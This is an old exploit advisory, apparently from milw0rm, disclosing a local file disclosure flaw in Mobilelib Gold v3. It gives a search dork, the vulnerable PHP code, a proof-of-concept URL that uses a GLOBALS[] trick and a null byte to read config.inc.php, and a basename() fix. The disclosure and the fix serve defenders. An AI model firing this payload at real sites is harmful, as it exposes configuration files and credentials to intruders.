<html><head><title>Mobilelib Gold v3 Local File Disclosure Vulnerability</title></head><pre>                                            ||          ||   | ||
                                     o_,_7 _||  . _o_7 _|| q_|_||  o_\\\_,
                                    (  :  /    (_)    /           (      .

                                             ___________________
                                           _/QQQQQQQQQQQQQQQQQQQ\__
                                        __/QQQ/````````````````\QQQ\___
                                      _/QQQQQ/                  \QQQQQQ\
                                     /QQQQ/``                    ```QQQQ\
                                    /QQQQ/                          \QQQQ\
                                   |QQQQ/    By  Qabandi             \QQQQ|
                                   |QQQQ|                            |QQQQ|
                                   |QQQQ|    From Kuwait, PEACE...   |QQQQ|
                                   |QQQQ|                            |QQQQ|
                                   |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
                                    \QQQQ\                      __  /QQQQ/
                                     \QQQQ\                    /QQ\_QQQQ/
                                      \QQQQ\                   \QQQQQQQ/
                                       \QQQQQ\                 /QQQQQ/_
                                        ``\QQQQQ\_____________/QQQ/\QQQQ\_
                                           ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
                                              ```````````````````     `````

=Vuln:		Mobilelib Gold v3 Local File Disclosure Vulnerability
=INFO:		http://www.ac4p.com/
=BUY:  		http://www.ac4p.com/
=Download:      ~~~
=DORK:		intext:&quot;English for dummies&quot;

                                  ____________
                              _-=/:Conditions:\=-_
````````````````````````````````````````````````````````````````````````````````

Magic_quotes MUST BE ON :)

---------------------------------------===--------------------------------------

                                _________________
                            _-=/:Vulnerable_Code:\=-_
````````````````````````````````````````````````````````````````````````````````
// in &quot;./myhtml.php&quot;

function getthememyhtml($page)
      {
      if (file_exists(&quot;./myhtmlpages/&quot;.$page.&quot;.html&quot;)) {
      $templat=&quot;./myhtmlpages/&quot;.$page.&quot;.html&quot;;
      $tempindex=@fopen($templat,&quot;r&quot;);
      $html=@fread($tempindex,@filesize($templat));
      @fclose($tempindex);
      } else {
       $html =&quot;&lt;p align=\&quot;center\&quot;&gt; áã íÓÊØÚ ÅíÌÇÏ ãáÝ ÇáÞÇáÈ.&lt;/p&gt;&quot;;
      }
      return $html;
}

---------------------------------------===--------------------------------------

                                     _______
                                 _-=/:P.o.C:\=-_
````````````````````````````````````````````````````````````````````````````````
 We will bypass the security, where it takes all _GET variables and scans if
 they contain harmful tags such as the null char (%00) ..etc
 
 We will bypass it by using an old GLOBALS[] trick ;)


http://localhost/goldv3/myhtml.php?GLOBALS[page]=../config.inc.php%00


---------------------------------------===--------------------------------------

                                    __________
                                _-=/:SOLUTION:\=-_
````````````````````````````````````````````````````````````````````````````````
// in &quot;./myhtml.php&quot;

function getthememyhtml($page)
      {
      $page = basename($page); //&lt;---- Added the good old Basename func ;)
      if (file_exists(&quot;./myhtmlpages/&quot;.$page.&quot;.html&quot;)) {
      $templat=&quot;./myhtmlpages/&quot;.$page.&quot;.html&quot;;
      $tempindex=@fopen($templat,&quot;r&quot;);
      $html=@fread($tempindex,@filesize($templat));
      @fclose($tempindex);
      } else {
       $html =&quot;&lt;p align=\&quot;center\&quot;&gt; áã íÓÊØÚ ÅíÌÇÏ ãáÝ ÇáÞÇáÈ.&lt;/p&gt;&quot;;
      }
      return $html;
}


---------------------------------------===--------------------------------------
 ______________________________________________________________________________
/                                                                              \
|      Sec-Code.com ;)  Shru7at Iktshaf al-thaghrat Qareeban!!il7ag sajjil!!   |
\______________________________________________________________________________/
                                \ No More Private /
                                 `````````````````
                           Salamz to All Muslim Hackers.

# milw0rm.com [2009-07-14]</pre></html>